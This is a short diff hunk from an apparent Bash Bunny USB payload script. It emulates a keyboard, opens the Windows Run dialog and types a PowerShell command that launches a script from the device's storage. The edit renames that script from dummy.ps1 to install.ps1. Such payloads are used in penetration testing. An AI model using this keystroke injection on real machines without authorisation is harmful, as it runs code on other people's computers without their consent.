@@ -16,6 +16,6 @@ LED R
 ATTACKMODE HID STORAGE
 QUACK GUI r
 QUACK DELAY 100
-QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\dummy.ps1')"
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\install.ps1')"
 QUACK ENTER
 LED G
